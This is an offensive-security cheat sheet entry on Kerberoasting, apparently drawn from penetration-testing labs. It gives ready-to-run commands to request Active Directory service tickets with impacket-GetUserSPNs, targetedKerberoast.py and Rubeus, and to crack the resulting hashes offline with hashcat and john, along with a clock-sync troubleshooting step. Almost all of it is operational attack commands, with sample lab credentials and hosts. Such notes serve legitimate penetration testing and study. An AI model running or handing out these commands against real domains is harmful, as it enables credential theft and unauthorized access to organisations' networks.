---
title: Kerberoasting
category: ad
subcategory: ad-attacks
os: linux, windows
command: impacket-GetUserSPNs -request domain/user:pass -dc-ip target
tools: impacket-GetUserSPNs, Rubeus, hashcat, john
---


### Remote (impacket) - need valid creds

```bash
impacket-GetUserSPNs -dc-ip 10.10.66.150 'vulnnet-rst.local/t-skid:tj072889*' -request
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

### Targeted variant (against discovered SPNs)

```bash
targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.208.40
```

Reference: https://github.com/ShutdownRepo/targetedKerberoast

### From a Windows host - Rubeus

```cmd
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

If a hash contains `;` and won't crack, try removing it first.

### Crack with hashcat (mode 13100)

```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Crack with john

```bash
john MSSQLSvc.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Time sync gotcha

If the request fails, sync clock with the DC:

```bash
sudo rdate -n 10.10.10.100
sudo ntpdate vulnnet-rst.local
```
